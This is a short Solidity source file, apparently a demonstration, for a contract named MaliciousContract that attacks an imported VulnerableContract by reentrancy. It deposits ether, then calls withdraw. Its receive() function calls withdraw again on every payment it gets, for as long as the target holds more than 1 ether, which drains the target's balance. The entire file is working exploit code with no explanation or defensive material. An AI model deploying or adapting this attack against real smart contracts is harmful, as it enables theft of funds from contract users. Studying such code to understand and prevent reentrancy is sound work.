// SPDX-License-Identifier: MIT
// pragma solidity 0.7.6;
pragma solidity 0.8.0;

import "./VulnerableContract.sol";

contract MaliciousContract {
    VulnerableContract private vulnerableContract;

    constructor(address payable addr) {
        vulnerableContract = VulnerableContract(addr);
    }

    function deposit() public payable {
        vulnerableContract.deposit{value: msg.value}();
    }

    function withdraw() public {
        vulnerableContract.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (address(vulnerableContract).balance > 1 ether) {
            try vulnerableContract.withdraw(1 ether) {
                // success
            } catch (bytes memory error) {
                revert("Error is here");
            }
        }
    }
}
